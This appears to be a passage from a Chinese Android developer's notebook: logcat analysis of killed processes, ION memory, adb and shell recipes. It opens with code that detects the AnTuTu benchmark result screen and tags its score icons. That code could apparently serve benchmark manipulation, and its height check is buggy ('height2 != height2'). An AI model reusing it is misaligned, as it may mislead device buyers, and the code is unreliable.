        if ("com.antutu.benchmark.ui.test.activity.ActivityTestResultDetails".equalsIgnoreCase(getClassName())) {
            int imageViewScoreIconId = getWidgetId("imageViewScoreIcon");
            if (getId() == imageViewScoreIconId) {
                if (drawable instanceof android.graphics.drawable.BitmapDrawable) {
                    Bitmap mBitmap = ((android.graphics.drawable.BitmapDrawable)drawable).getBitmap();
                    boolean compareNext = true;
                    Bitmap mBitmapCpu = android.graphics.BitmapFactory.decodeResource(getContext().getResources(), getMipmapId("ic_score_icon_cpu"));
                    if (compareNext && compareBitmap(mBitmap, mBitmapCpu)) {
                        setTag("CPU");
                        compareNext = false;
                    }
                    Bitmap mBitmapGpu = android.graphics.BitmapFactory.decodeResource(getContext().getResources(), getMipmapId("ic_score_icon_gpu"));
                    if (compareNext && compareBitmap(mBitmap, mBitmapGpu)) {
                        setTag("GPU");
                        compareNext = false;
                    }
                    Bitmap mBitmapMem = android.graphics.BitmapFactory.decodeResource(getContext().getResources(), getMipmapId("ic_score_icon_mem"));
                    if (compareNext && compareBitmap(mBitmap, mBitmapMem)) {
                        setTag("MEM");
                        compareNext = false;
                    }
                    Bitmap mBitmapUx = android.graphics.BitmapFactory.decodeResource(getContext().getResources(), getMipmapId("ic_score_icon_ux"));
                    if (compareNext && compareBitmap(mBitmap, mBitmapUx)) {
                        setTag("UX");
                        compareNext = false;
                    }
                }
            }
        }
    }
}

private boolean compareBitmap(Bitmap bitmap1, Bitmap bitmap2) {
    if (bitmap1 == null || bitmap2 == null) {
        return false;
    }
    int width1 = bitmap1.getWidth();
    int height1 = bitmap1.getHeight();
    int width2 = bitmap2.getWidth();
    int height2 = bitmap2.getHeight();
    if (width1 != width2) {
        return false;
    }
    if (height2 != height2) {
        return false;
    }
    int countPoints = 0;
    for (int i = 0; i < width1; i++) {
        for (int k = 0; k < height1; k++) {
            if (bitmap1.getPixel(i, k) == bitmap2.getPixel(i, k)) {
                countPoints++;
            }
        }
    }
    if (countPoints < (width1 * height1 / 2)) {
        return false;
    }
    return true;
}
```

## android如何分析进程被杀问题

```text
查看进程被杀的3个步骤
确定被杀进程的包名
有人给出直接用
百度搜索app对应的包名
确定进程被杀的精确时间点
有进程被杀时间点及原因包名，则直接用
log中搜索正则表达式（gedit支持正则）am_proc_died: [0,[0-9] *,xxxx,，xxxx代表包名 ，拿到这行log的时间点以及进程pid
eg: 08-19 10:06:55.302 1000 1699 12137 I am_proc_died: [0,9307,com.quark.browser,905,11] 
如上栗子：时间点为08-19 10:06:55.302 （搜索时可自行减几毫秒，否则可能搜索不到同时间点的其他log），进程pid为9307

查看进程被杀原因
在system log（logcat -v 下面）或event log（logcat -b events下面）搜索2中时间点附近对应pid的log
12-16 15:46:10.814 root 756 756 I Zygote : Process 9187 exited due to signal 11 (Segmentation fault)
12-16 15:46:10.830 1000 1747 2367 I ActivityManager: Process com.tencent.mm (pid 9187) has died: fg TOP
或者搜索对应包名的ApplicationExitInfo
ApplicationExitInfo #14:
timestamp=2020-12-16 15:45:08.647
pid=6175
realUid=10249
packageUid=10249
definingUid=10249
user=0
process=com.tencent.mm
reason=2 (SIGNALED)
status=11
importance=100
pss=204MB
rss=311MB
description=null
state=empty
trace=null
常见的查杀类型
LowMemoryKiller（低内存查杀）
原因查找：
直接搜索lowmemorykiller: Kill ‘com.xxx.xxx’ (pid)
08-19 10:06:55.207 lmkd 954 954 E lowmemorykiller: Kill ‘com.quark.browser’ (9307), uid 10248, oom_adj 905 to free 69048kB
08-19 10:06:55.207 lmkd 954 954 I lowmemorykiller: Reclaimed 69048kB, cache(718372kB) and free(314436kB)-reserved(43892kB) below min(765000kB) for oom_adj 900
代表：手机cache 内存为718372kb，低于oom_adj 900这个级别的最低值765000kB，所以lmkd会查杀pid为9307的com.quark.browser进程，该进程当前的adj为905（高于900），释放了69048kb

未有lowmemorykiller打印，但是am_low_memory递减同时，am_proc_died同时打印，且system log中有has died 打印
07-30 22:18:26.746 1000 1718 5108 I ActivityManager: Process com.xiaomi.channel (pid 21963) has died: hvy HVY
07-30 22:18:26.746 1000 1718 5127 I am_low_memory: 68
07-30 22:18:26.746 1000 1718 5108 I am_proc_died: [0,21963,com.xiaomi.channel,400,14] 
07-30 22:18:26.803 1000 1718 5127 I am_low_memory: 66
代表：am_low_memory 后面的数字代表当前系统中lru 中进程的数量，数字递减代表有进程被杀，has died 代表非AMS查杀（lmk查杀或信号查杀），hvy HVY代表进程的优先级（进程自查一览表）

看下手机内存状态以及占内存较高的应用
log中搜索 dumpsys meminfo，赋值粘贴如下信息到jira上

内存状态信息
Total RAM: 5,510,720K (status normal)
Free RAM: 1,092,011K ( 31,027K cached pss + 938,028K cached kernel + 864K cached ion + 122,092K free)
Used RAM: 5,982,010K (5,483,142K used pss + 498,868K kernel)
Lost RAM: 266,644K
ZRAM: 462,104K physical used for 1,590,008K in swap (3,014,028K total swap)
Tuning: 256 (large 512), oom 967,680K, restore limit 322,560K (high-end-gfx)
--------- 9.460s was the duration of dumpsys meminfo, ending at: 2020-08-15 12:33:59
代表如下：
手机总可用内存为5,510,720K
Free的cache 内存为31,027K cached pss
主要使用的是 5,483,142K
丢失内存：266,644K 这个值过大不正常

高优先级应用（占用达6位数的）：
Total PSS by process:
509,265K: com.tencent.mm (pid 8448 / activities) ( 148,217K in swap)
315,084K: com.miui.miwallpaper.earth:earthSuperWallpaper (pid 4223) ( 42,026K in swap)
304,568K: system (pid 1699) ( 33,679K in swap)
295,422K: com.miui.home (pid 4283 / activities) ( 107,864K in swap)
258,716K: com.tencent.mm (pid 10718 / activities) ( 119,475K in swap)
195,761K: android.hardware.camera.provider@2.4-service_64 (pid 847) ( 194,356K in swap)
170,929K: com.tencent.mm:tools (pid 25205) ( 136K in swap)
170,385K: surfaceflinger (pid 956) ( 7,976K in swap)
163,051K: com.android.systemui (pid 4066) ( 61,983K in swap)
140,609K: com.xiaomi.smarthome (pid 10748) ( 75,044K in swap)
104,044K: com.tencent.mobileqq (pid 17557) ( 589K in swap)
正常查杀empty进程
08-10 13:32:13.057 1000 1700 1812 I am_kill : [0,2409,com.miui.screenrecorder,955,empty for 1800s] 
empty进程数量达到阈值了，会查杀30min内没活跃的进程
08-10 16:00:54.244 1000 1700 1795 I ActivityManager: Killing 20081:com.android.providers.calendar/u0a72 (adj 985): empty #26
系统内empty进程数量达到阈值26（不同手机略有不同）会按时间顺序查杀进程
客户端调用startInstrumentation，会先forceStopPackage再拉起，可能会查杀到相关的其他进程
08-03 15:10:02.933 1000 1303 12534 I ActivityManager: Force stopping com.eg.android.AlipayGphone appid=10198 user=0: start instr
08-03 15:10:02.933 1000 1303 12534 I ActivityManager: Killing 1441:com.kugou.android/u0a219 (adj 0): stop com.eg.android.AlipayGphone: start instr

进程自己退出
08-13 10:17:04.053 root 689 689 I Zygote : Process 29263 exited cleanly (0)
08-13 10:17:04.056 1000 1692 1805 I libprocessgroup: Successfully killed process cgroup uid 10252 pid 29263 in 122ms
08-13 10:17:03.933 1000 1692 5189 I ActivityManager: Process com.tencent.tmgp.pubgmhd (pid 29263) has died: hvy HVY

idle maint查杀
设备处于两次idle之间低内存状态持续时间超1/3,会查杀内存增长较高的进程，原生策略。
08-14 09:43:55.617 1000 1477 1779 I am_wtf : [0,1477,system_server,-1,ActivityManager,Killcom.tencent.mm in idle maint: pss=365677, swapPss=174343, initialPss=173858, period=+1h17m4s218ms, lowRamPeriod=+1h8m19s250ms] 
08-14 09:43:55.625 1000 1477 1477 I am_kill : [0,17579,com.byai.crm,100,idle maint (pss 165820 from 95133)] 
08-14 09:43:55.772 1041 664 31875 I [30200]  : 17579&10168&0&-1
08-14 09:43:55.724 1000 1477 1514 I am_proc_died: [0,17579,com.byai.crm,100,4] 

installPackageLI/ deletePackageX等
只要是forceStopPackage接口查杀就有可能查杀到关联的进程，如下拨号就是因为与gms关联被杀

08-10 15:59:30.827 1000 1700 1812 I ActivityManager: Force stopping com.google.android.gms appid=10190 user=-1: installPackageLI
08-10 15:59:30.984 1000 1700 1812 I ActivityManager: Killing 3876:com.google.android.dialer/u0a180 (adj -700): stop com.google.android.gms: installPackageLI

过渡使用CPU
09-06 18:07:44.445 1000 1651 1798 I am_kill : [0,22157,com.ximalaya.ting.android,900,excessive cpu 16720 during 300044 dur=2221553 limit=2] 
09-06 18:07:44.445 1000 1651 1798 I ActivityManager: Killing 22157:com.ximalaya.ting.android/u0a239 (adj 900): excessive cpu 16720 during 300044 dur=2221553 limit=2
09-06 18:07:44.566 root 681 681 I Zygote : Process 22157 exited due to signal 9 (Killed)

上次adj降为Service以下到现在经历2221553 ms，cpu POWER_CHECK_MAX_CPU_4 = 2, 两次检测时间间隔为300044 ms，使用cpu时间为16720ms，超过2%

进程的某个线程发生异常，自己发Signal 9信号给Zygote 杀掉自己
09-07 16:53:03.027 1000 2566 2582 I Process : Sending signal. PID: 2566 SIG: 9
09-07 16:53:03.154 root 681 681 I Zygote : Process 2566 exited due to signal 9 (Killed)
09-07 16:53:03.167 1000 1734 4006 I ActivityManager: Process com.android.systemui (pid 2566) has died: pers PER

某个app调用forceStopPackage 接口
03-25 19:34:10.498 26589 29585 I ActivityManager: Killing 14459:com.xiaomi.misubscreenui/1000 (adj 0): stop com.xiaomi.misubscreenui due to from process:com.miui.voiceassist
————————————————
版权声明：本文为CSDN博主「AmyTan小小燕」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/xiaoyantan/article/details/118489613
```

## ION

```text
https://blog.csdn.net/armwind/article/details/53454251
https://www.cnblogs.com/willhua/p/10029280.html

ION设计的目标

ION 定义了四种不同的heap，实现不同的内存分配策略。
ION_HEAP_TYPE_SYSTEM : 通过vmalloc分配内存
ION_HEAP_TYPE_SYSTEM_CONTIG: 通过kmalloc分配内存
ION_HEAP_TYPE_CARVEOUT: 在保留内存块中(reserve memory)分配内存
ION_HEAP_TYPE_CUSTOM: 由客户自己定义

为了避免内存碎片化，或者者为少量有着特殊内存需求的硬件，比方GPUs、display controller以及camera等，在系统启动的时候，会为他们预留少量memory pools，这些memory pools就由ION来管理。通过ION即可以在硬件以及user space之间实现zero-copy的内存share。

ION的实现

ION通过ION heaps来展现presents它对应的memory pools。不同的Android硬件可能会要求不同的ION heaps实现，默认的ION驱动会提供如下三种不同的ION heaps实现：ION_HEAP_TYPE_SYSTEM: memory allocated via vmalloc_user()

ION_HEAP_TYPE_SYSTEM_CONTIG: memory allocated via kzalloc

. ION_HEAP_TYPE_CARVEOUT: carveout memory is physically contiguous and set aside at boot.

开发者可以自己实现更多的ION heaps。比方NVIDIA就提交了一种ION_HEAP_TYPE_IOMMU的heap，这种heap带有IOMMU功能。

不论哪一种ION heaps实现，他们都必需实现如下接口：struct ion_heap_ops { int (*allocate) (struct ion_heap *heap, struct ion_buffer *buffer, unsigned long len, unsigned long align, unsigned long flags); void (*free) (struct ion_buffer *buffer); int (*phys) (struct ion_heap *heap, struct ion_buffer *buffer, ion_phys_addr_t *addr, size_t *len); struct scatterlist *(*map_dma) (struct ion_heap *heap, struct ion_buffer *buffer); void (*unmap_dma) (struct ion_heap *heap, struct ion_buffer *buffer); void * (*map_kernel) (struct ion_heap *heap, struct ion_buffer *buffer); void (*unmap_kernel) (struct ion_heap *heap, struct ion_buffer *buffer); int (*map_user) (struct ion_heap *heap, struct ion_buffer *buffer, struct vm_area_struct *vma); };

简单来说，接口的各个函数功能如下：allocate()和free()分别用来从heap中分配或者者释放一个ion_buffer对象

对于物理连续的内存，phys()用来得到ion_buffer对象的物理内存地址及其大小。假如heap没有提供物理连续的内存，那么它也可以不用提供这个接口。其中，ion_phys_addr_t将来会被定义在/include/linux/types.h中的phys_addr_t替代。

map_dma()和unmap_dma()分别来用使ion_buffer对象为DMA(Direct Memory Access，直接内存存取。顾名思义，不占用cpu资源，从一个硬件存储区域把一部分连续的数据复制到另一个硬件存储区域)做好准备或者者取消做好准备

map_kernel()和unmap_kernel()分别用来把physical memory映射(map)到内核虚拟地址空间(kernel virtual address space)或者者取消映射

map_user()用来把physical memory映射(map)到客户内存空间(user space)。为什么没有对应的unmap_user()呢？由于，这个映射用一个file descriptor来表示，当这个file descriptor关闭的时候，这个映射关系就自动取消了。

在user space使用ION

使用场景

典型的，在客户空间使用的设施访问库(user space device access libraries)一般使用ION来分配大块连续的media buffers。比方，still camera library分配一个capture buffer来供camera device使用。当这个buffer填满video data的时候，这个library就能把这块buffer传递给kernel，而后让JPEG硬编码板块来解决。

具体使用细节

在user space 的C/C++程序能够能够分配ION内存之前，它必需取得访问/dev/ion的权限。通过调用open("/dev/ion", O_RDONLY)即可取得一个以handle形式返回的file descriptor，这个file descriptor用来代表一个ION client。注意，尽管传给open一个O_RDONLY参数，但是你依然可对这块memory进行写操作。在一个user process中最多有一个client。当有了一个client之后，即可以开始分配ION内存。为了分配内存，client必需填满下面的ion_allocation_data结构，handle除外，由于它是output参数。其余三个参数分别指明内存的大小、对齐方式以及flags。flags是一个bit mask，用来说明可以从哪些heaps中分配想要的内存。其决定顺序由系统启动时，通过ion_device_add_heap()增加的heap顺来决定。比方，ION_HEAP_TYPE_CARVEOUT是在ION_HEAP_TYPE_CONTIG之前被add的，那么假如flags = ION_HEAP_TYPE_CONTIG | ION_HEAP_TYPE_CARVEOUT，那么就是先尝试分配ION_HEAP_TYPE_CARVEOUT类型的heap，假如不行，再尝试分配ION_HEAP_TYPE_CONTIG类型的heap。()struct ion_allocation_data { size_t len; size_t align; unsigned int flags; struct ion_handle *handle; }

user space通过ioctl()系统接口来与ION交互。在client填充ion_allocatoin_data结构之后，即可以通过调用int ioctl(int client_fd, ION_IOC_ALLOC, struct ion_allocation_data *allocation_data)来allocate a buffer。这个调用详情之后，分配的buffer会通过ion_allocatoin_data的handle来返回，但是CPU不可以访问这个buffer。这个handle只可以通过调用int ioctl(int client_fd, ION_IOC_SHARE, struct ion_fd_data *fd_data);来取得一个用来share的file descriptor。这里，client_fd参数是前面通过open取得的一个对应/dev/ion file descriptor，fd_data是如下的数据结构，其handle对应ion_allocation_data::handle，是input参数；fd则是output参数，可以用来share。

当一个user process中的client分享(share)了这个fd之后，在其余user process中(当然，也可share给创立这个fd的client自己)，为了取得这个shared buffer，先必需通过调用open("/dev/ion", O_RDONLY)取得一个client。(注：ION通过线程的PID来track各个client， 尤其是process中的"group leader"线程的PID。在相同的process中重复调用open("/dev/ion", O_RDONLY)只会取得指向kernel同一个client的another file descriptor)。取得client之后，而后再通过mmap()函数来把这个fd映射到address space of process(mmap函数参考1，参考2)。假如要释放这个fd对应的buffer，在调用mmap()的process中，先要通过munmap()来取消mmap()的效果。而后在之前share这个fd的client中，需要通过int ioctl(int client_fd, ION_IOC_FREE, struct ion_handle_data *handle_data);来关闭这个fd对应的file descriptor。其中，ion_handle_data表示前面通过ION_IOC_ALLOC命令取得的handle，其定义如下：struct ion_handle_data { struct ion_handle *handle; }

这个ION_IOC_FREE命令会导致对应的handle的计数减1。当handle计数为0的时候，其指向的ion_handle对象就会被销毁，并且相关的ION bookkeeping数据结构也会升级。

Demo

在这个Demo中，fd在同一个client中被share使用：来源#include#include #include #include #include #include #include "/home/developer/kernel3.4/goldfish/include/linux/ion.h"void main(){ struct ion_fd_data fd_data; struct ion_allocation_data ionAllocData; ionAllocData.len=0x1000; ionAllocData.align = 0; ionAllocData.flags = ION_HEAP_TYPE_SYSTEM; int fd=open("/dev/ion",O_RDWR); ioctl(fd,ION_IOC_ALLOC, &ionAllocData); fd_data.handle = ionAllocData.handle; ioctl(fd,ION_IOC_SHARE,&fd_data); int *p = mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,fd_data.fd,0); p[0] =99; perror("test"); printf("hello all %d\n",p[0] );}

在kernel中share ION buffer

在kernel中支持multiple clients，每一个使用ION功能的driver都可以在kernel中对应一个client。一个kernel driver通过调用struct ion_client *ion_client_create(struct ion_device *dev, unsigned int heap_mask, const char *debug_name)来取得一个ION client handle(注意，前面在user space中通过open("/dev/ion", O_RDONLY)返回的client是int类型)。dev参数是一个和/dev/ion相关的global ION device，heap_mask参数和之前提到的ion_allocation_data的flags成员一样的含义。

当在user space中通过ION_IOC_SHARE命令得到一个buffer的file descriptor并把它传递给kernel之后，kernel driver通过调用struct ion_handle *ion_import_fd(struct ion_client *client, int fd_from_user);来把这个fd变成一个ion_handle对象，这个对象就是这个driver中对相应的buffer一个client-local reference。ion_import_fd方法会根据这个buffer的物理地址来查找：在本client中能否已经obtained一个对应此buffer的ion_handle，假如是的话，那么即可以简单的添加这个ion_handle的引用计数就可。

有些硬件只能通过physical addresses来操作physically-contiguous buffers，那么，这些对应的drivers就需要通过调用int ion_phys(struct ion_client *client, struct ion_handle *handle, ion_phys_addr_t *addr, size_t *len)来把ion_handle转变成一个physical buffer。当然，假如这个buffer不是physically contiguous，那么这个调用就会失败。

当解决一个来自client的调用时，ION会validates 输入的 file descriptor, client and handle arguments。比方ION会确保 file descriptor是由ION_IOC_SHARE命令创立的；比方当ion_phys()调用时，ION会检测这个buffer能否在这个client对应有访问权限list中，假如不是，那么就会返回错误。这样的验证机制能够减少可能的unwanted accesses以及疏忽的内存泄露。

ION通过debugfs提供可视化的debug，它通过在/sys/kernel/debug/ion下面，使用stored files来记录相应的heaps和clients，并使用symbolic names或者者PIDs来标志。

比较ION和DMABUFION和DMABUF都是通过传递一个匿名file descriptor对象，给其余client一个基于引用计数的访问权限，从而达到分享内存的目的。

ION通过一个可分享和追踪的方式从预留的memory pool中分配内存。

DMABUF更多的专注于buffer导入、导出以及同步的方式来实现在NON-ARM架构上的buffer的分享。

ION目前只支持Android kernel

ION所有的user-space program都可以通过/dev/ion接口来分配ION内存。但是在Android会通过验证user和group IDs的方式来阻止对ION的非受权访问。
```

## [cmd] 通过adb shell dumpsys carrier_config查看当前sim的对业务的支持状态

```text
adb shell dumpsys carrier_config

可以通过 adb shell dumpsys carrier_config 来获取各个卡槽的信息状态：
```

## [cmd] adb shell cmd wifi list-scan-results

```text
zq@zq-ThinkStation-P340:~/projects/SPRDROID12_TRUNK_22B_W22.09.2/alps$ adb shell cmd wifi list-scan-results
    BSSID              Frequency      RSSI           Age(sec)     SSID                                 Flags
  28:d1:27:e3:9c:43       2412        -35            114.355    MI5                               [WPA2-PSK-CCMP]  [RSN-PSK+SAE-CCMP]  [ESS]  [WPS] 
  8c:a6:df:43:bb:35       2412        -37            114.319    Sagereal-Meeting                  [WPA2-PSK-CCMP]  [RSN-PSK-CCMP]  [WPA-PSK-CCMP]  [ESS] 
  d4:68:ba:03:cf:cc       2472        -54            113.866    Internet                          [ESS] 
  2e:d1:27:e3:9c:43       2412        -36            114.372                                      [ESS] 
  66:6e:97:92:cf:e4       2437        -56            114.156    SR-Test2                          [WPA-PSK-CCMP]  [WPA2-PSK-CCMP]  [RSN-PSK-CCMP]  [ESS] 
  14:75:90:bd:86:90       2437        -45            114.151    TP_LINK_686F                      [WPA2-PSK-CCMP]  [RSN-PSK-CCMP]  [WPA-PSK-CCMP]  [ESS] 
  f4:2a:7d:4e:68:5f       2437        -39            114.171    MI3                               [WPA-PSK-CCMP]  [WPA2-PSK-CCMP]  [RSN-PSK-CCMP]  [ESS] 
  8c:a6:df:4e:ea:00       2462        -56            113.962    Sagereal-Guest                    [WPA2-PSK-CCMP]  [RSN-PSK-CCMP]  [WPA-PSK-CCMP]  [ESS] 
  74:05:a5:43:29:ed       2462        -51            114.014    MI4                               [WPA-PSK-CCMP]  [WPA2-PSK-CCMP]  [RSN-PSK-CCMP]  [ESS] 
  cc:08:fb:1c:45:c3       2462        -50            113.942    MI1                               [WPA-PSK-CCMP]  [WPA2-PSK-CCMP]  [RSN-PSK-CCMP]  [ESS] 
  34:f7:16:72:cc:b2       2462        -55            113.919    MI2                               [WPA-PSK-CCMP]  [WPA2-PSK-CCMP]  [RSN-PSK-CCMP]  [ESS] 
  64:6e:97:d2:cf:e4       2437        -60            114.140    SR-main                           [WPA-PSK-CCMP]  [WPA2-PSK-CCMP]  [RSN-PSK-CCMP]  [ESS] 
  54:a7:03:74:6d:ca       2412        -46            114.315    SR-GMOffice                       [ESS] 
```

## Nova wifi热点默认名称

```text
开机的时候看到有如下 log
adb logcat | grep "Nova"
10-21 09:37:42.220  1400  1400 D SetupWizard: setDefaultWifiSoftAp: Nova_1916
10-21 09:37:43.961  1400  1400 D SetupWizard: setDefaultWifiSoftAp: Nova_2916
10-21 09:37:45.729  1400  1400 D SetupWizard: setDefaultWifiSoftAp: Nova_6074
10-21 09:37:46.123  1400  1400 D SetupWizard: setDefaultWifiSoftAp: Nova_8471
10-21 09:37:48.802  1400  1400 D SetupWizard: setDefaultWifiSoftAp: Nova_8433


adb shell ps | grep "1400"
system        1400   512 1135452 132040 0                   0 S com.hmdglobal.app.setupwizardext


adb shell pm path com.hmdglobal.app.setupwizardext
package:/system/priv-app/HMDSetupWizard/HMDSetupWizard.apk


pathmod HMDSetupWizard
/home/zq/projects/SPRDROID12_TRUNK_22B_W22.09.2/alps/packages/apps/SRApps/HMDSetupWizard

grep setSsid /home/zq/projects/SPRDROID12_TRUNK_22B_W22.09.2/alps/packages/apps/SRApps/HMDSetupWizard -r
./src/com/hmdglobal/app/setupwizardext/WelcomeSetupWizard.java:                            .setSsid(apSSID)


//Added by liaoxiaomin for [DM5]  [DM5-4516]  [AMT]  [hotspot] The default name of hotspot is inconsistent with the requirement document. begin
private void setDefaultWifiSoftAp() {
    String displayname = SystemProperties.get("ro.build.model.displayname");
    String apSSID = (TextUtils.isEmpty(displayname) ? Build.MODEL : displayname) + "_" + getRandomIntForDefaultSsid();//Build.MODEL ="ro.product.model"
    Log.d("SetupWizard", "setDefaultWifiSoftAp: " + apSSID);
    //if (!TextUtils.isEmpty(apSSID)) {
        WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
        SoftApConfiguration softApConfiguration = wifiManager.getSoftApConfiguration();
        SoftApConfiguration newSoftApConfiguration =
                new SoftApConfiguration.Builder(softApConfiguration)
                        .setSsid(apSSID)
                        .setShutdownTimeoutMillis(600_000)
                        .setMaxNumberOfClients(10)
                        .setAutoShutdownEnabled(true)
                        .build();
        Log.d("SetupWizard", "setDefaultWifiSoftAp: sucess");
        wifiManager.setSoftApConfiguration(newSoftApConfiguration);
    //}
}
```

## framework模块调试

```text
修改framework/base/code模块验证方法
adb root
adb remount
adb push out/target/product/xxxxx/system/framework/arm/* /system/framework/arm/
adb push out/target/product/xxxxx/system/framework/framework.jar /system/framework/
adb push out/target/product/xxxxx/system/framework/boot* /system/framework/

修改framework/services模块验证方法
adb root
adb remount
adb push out/target/product/xxxxx/system/framework/oat/arm/services* /system/framework/oat/arm/
adb push out/target/product/xxxxx/system/framework/services.jar.prof /system/framework/
adb push out/target/product/xxxxx/system/framework/services.jar /system/framework/
```

## 模拟双击

```text
1，记录数据文件到recordtap

dd if=/dev/input/event3 of=/sdcard/recordtap

2，点击需要点击的位置，产生点击数据，然后按 ctrl+c 结束

3，写入文件

for i in `seq 1 100`; do dd if=/sdcard/recordtap of=/dev/input/event3;sleep 0.1; done

利用循环语句实现多次点击；每次点击后休眠0.1s，否则数据写入太快机器也无法反应过来。
```

## Android 手动旋转屏幕

```text
adb shell settings put system accelerometer_rotation 0
adb shell content insert --uri content://settings/system --bind name:s:user_rotation --bind value:i:0   //旋转0度
adb shell content insert --uri content://settings/system --bind name:s:user_rotation --bind value:i:1   //旋转90度
adb shell content insert --uri content://settings/system --bind name:s:user_rotation --bind value:i:2   //旋转180度
adb shell content insert --uri content://settings/system --bind name:s:user_rotation --bind value:i:3   //旋转270度
```

## AndroidS 新建产品lunch

```text
https://blog.csdn.net/qq_37858386/article/details/127885711
```

## 利用shell脚本在某个文件的某行下添加几行文本

```text
#!/bin/sh

path=$(pwd)
res=$(sed -n '19p' /usr/lib64/python2.7/posixpath.py) #判断这个文件中19行是否有字符

if [ -z ${res} ]   #如果19行没有字符串，则执行下面的命令，反之执行else后面的语句
then
#在第18行下添加if sys.ge...语句  \(为转义字符为（
sed -i "18a\if sys.getdefaultencoding\(\)\!\=\'utf-8\'\:" /usr/lib64/python2.7/posixpath.py 
sed -i "19a\  reload\(sys\)"  /usr/lib64/python2.7/posixpath.py
sed -i "20a\  sys.setdefaultencoding\(\'utf-8\'\)"  /usr/lib64/python2.7/posixpath.py
else
echo ""
fi
```

## 如何提高应用线程的优先级

```text
添加提高线程优先级的修改：
修改文件/device/sprd/mpool/module/performance/msoc/qogirl6/mfeature/kernel/kernel14.14/sprd_performance_config.xml（找到对应的工程）
  <policy name="Schedule">
    <config name="SchedAdjustment" >
      <item package="com.tencent.tmgp.sgame">
        <process>com.tencent.tmgp.sgame</process>
          <string-array name= "threads">
            <string>cent.tmgp.sgame, other, -19</string>
            <string>Unity*, other, -19</string>
          </string-array>
      </item>
     +  <item package="com.tencent.godgame">     //进程的包名
     +    <process>tencent.godgame</process>    //进程名
     +    <string-array name= "threads">
     +      <string>Thread*, other,-19</string>  // 线程名称，线程调度策略，线程优先级  
     +      <string>Unity*, other,-19</string>
     +    </string-array>
     +  </item>
```

## tbd

```text
setprop persist.tcl.debug.installapk 1
setprop persist.tcl.installapk.enable 1
```text
